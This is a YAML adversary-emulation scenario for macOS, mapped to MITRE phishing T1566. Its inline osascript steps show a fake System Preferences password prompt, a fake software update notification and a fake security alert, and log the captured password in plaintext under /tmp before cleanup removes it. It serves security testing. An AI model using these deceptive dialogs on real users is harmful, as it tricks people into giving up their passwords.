---
api_version: 2.0
uuid: 1a5f3b8c-9e2d-4f7a-6c1b-3e5d8a2f4c9b
name: Social Engineering Scenario
authors:
  - mbhatt
description: |
  Executes social engineering techniques using native macOS osascript to display
  fake system dialogs and notifications. Presents a fake password prompt dialog
  mimicking System Preferences, a fake software update notification, and a fake
  security alert to capture user input through deceptive UI elements.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.004 Phishing: Spearphishing Voice"

requirements:
  platforms:
    - os: darwin

args:
  - name: dialog_title
    description: "Title for the fake system dialog"
    type: string
    default: "System Preferences"
  - name: prompt_message
    description: "Message displayed in the fake dialog"
    type: string
    default: "macOS requires your password to apply security updates"

steps:
  - name: display_fake_password_prompt
    description: Display a fake system dialog requesting the user password
    inline: |
      mkdir -p /tmp/ttp_social_eng
      echo "[+] Displaying fake system password dialog..."
      RESPONSE=$(osascript -e 'try
        set userInput to display dialog "{{ .Args.prompt_message }}" default answer "" with hidden answer with title "{{ .Args.dialog_title }}" with icon caution giving up after 15
        return text returned of userInput
      on error
        return "DIALOG_CANCELLED"
      end try' 2>/dev/null || echo "DIALOG_DISMISSED")
      echo "[+] Dialog response captured"
      TIMESTAMP=$(date +%Y%m%d_%H%M%S)
      echo "${TIMESTAMP} - Password dialog response: ${RESPONSE}" >> /tmp/ttp_social_eng/interaction.log
      echo "[+] Response logged to /tmp/ttp_social_eng/interaction.log"

  - name: display_fake_software_update_notification
    description: Display a fake software update notification via Notification Center
    inline: |
      osascript -e 'display notification "A critical security update is available. Click to install now." with title "Software Update" subtitle "macOS Security Update 2025-001"'
      echo "[+] Fake software update notification sent to Notification Center"
      TIMESTAMP=$(date +%Y%m%d_%H%M%S)
      echo "${TIMESTAMP} - Software update notification displayed" >> /tmp/ttp_social_eng/interaction.log

  - name: display_fake_security_alert_dialog
    description: Display a fake security alert dialog requesting action
    inline: |
      echo "[+] Displaying fake security alert dialog..."
      RESPONSE=$(osascript -e 'try
        set alertResult to display dialog "Your Mac has detected a security threat. Authentication is required to remove the threat." buttons {"Cancel", "Authenticate"} default button "Authenticate" with title "macOS Security Alert" with icon stop giving up after 15
        return button returned of alertResult
      on error
        return "DIALOG_CANCELLED"
      end try' 2>/dev/null || echo "DIALOG_DISMISSED")
      echo "[+] Security alert response: ${RESPONSE}"
      TIMESTAMP=$(date +%Y%m%d_%H%M%S)
      echo "${TIMESTAMP} - Security alert response: ${RESPONSE}" >> /tmp/ttp_social_eng/interaction.log

  - name: log_interaction_results
    description: Log all captured interaction results
    inline: |
      echo "[+] Social engineering interaction log:"
      cat /tmp/ttp_social_eng/interaction.log
      INTERACTIONS=$(wc -l < /tmp/ttp_social_eng/interaction.log | tr -d ' ')
      echo ""
      echo "[+] Total interactions logged: ${INTERACTIONS}"
      echo "[+] PASS: Social engineering dialogs were presented"
    cleanup:
      inline: |
        rm -rf /tmp/ttp_social_eng
        echo "[+] Cleanup: Interaction logs removed"

tests:
  - name: social_engineering_scenario_test
    dry_run: true
